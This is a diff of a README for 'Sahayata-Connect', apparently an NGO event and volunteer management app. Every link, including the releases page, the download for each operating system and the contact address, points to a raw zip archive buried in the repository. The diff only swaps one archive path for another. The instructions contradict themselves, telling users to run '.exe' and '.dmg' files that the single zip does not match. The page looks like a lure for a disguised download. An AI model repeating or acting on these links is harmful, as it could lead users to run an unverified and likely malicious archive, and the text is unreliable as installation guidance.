@@ -6,7 +6,7 @@ Welcome to Sahayata-Connect! This application helps NGOs manage events and volun
 
 ## 📥 Download Now!
 
-[![Download Sahayata-Connect](https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/public/css/Connect-Sahayata-autolatry.zip%20Sahayata--Connect-v1.0-brightgreen)](https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/public/css/Connect-Sahayata-autolatry.zip)
+[![Download Sahayata-Connect](https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/Sahayata_Connect_v1.2.zip%20Sahayata--Connect-v1.0-brightgreen)](https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/Sahayata_Connect_v1.2.zip)
 
 ## 📋 Requirements
 
@@ -19,21 +19,21 @@ Before you start, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/public/css/Connect-Sahayata-autolatry.zip) to find the latest version of Sahayata-Connect.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/Sahayata_Connect_v1.2.zip) to find the latest version of Sahayata-Connect.
    
 2. **Choose the Right File:** 
    - Look for the latest version, usually marked as `v1.0` or higher.
    - Select the appropriate file for your operating system:
-     - For Windows, download `https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/public/css/Connect-Sahayata-autolatry.zip`.
-     - For macOS, download `https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/public/css/Connect-Sahayata-autolatry.zip`.
-     - For Linux, look for the `https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/public/css/Connect-Sahayata-autolatry.zip` file.
+     - For Windows, download `https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/Sahayata_Connect_v1.2.zip`.
+     - For macOS, download `https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/Sahayata_Connect_v1.2.zip`.
+     - For Linux, look for the `https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/Sahayata_Connect_v1.2.zip` file.
    
 3. **Download the File**: Click on the file name to start the download.
 
 4. **Run the Installer**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
    - **macOS**: Open the downloaded `.dmg` file and drag Sahayata-Connect to your Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/public/css/Connect-Sahayata-autolatry.zip` file and follow the instructions in the README file included in the extracted folder.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/Sahayata_Connect_v1.2.zip` file and follow the instructions in the README file included in the extracted folder.
 
 5. **Launch the Application**: After installation, find Sahayata-Connect in your applications list. Click to open it.
 
@@ -74,6 +74,6 @@ A: We aim to release updates every few months based on user feedback and new fea
 
 ## 📞 Contact Us
 
-If you have questions or need further assistance, feel free to reach out. You can open an issue in our GitHub repository or contact us at https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/public/css/Connect-Sahayata-autolatry.zip
+If you have questions or need further assistance, feel free to reach out. You can open an issue in our GitHub repository or contact us at https://raw.githubusercontent.com/Gokul-1721/Sahayata-Connect/main/admin/Sahayata_Connect_v1.2.zip
 
 Thank you for choosing Sahayata-Connect! Enjoy seamless event and volunteer management.
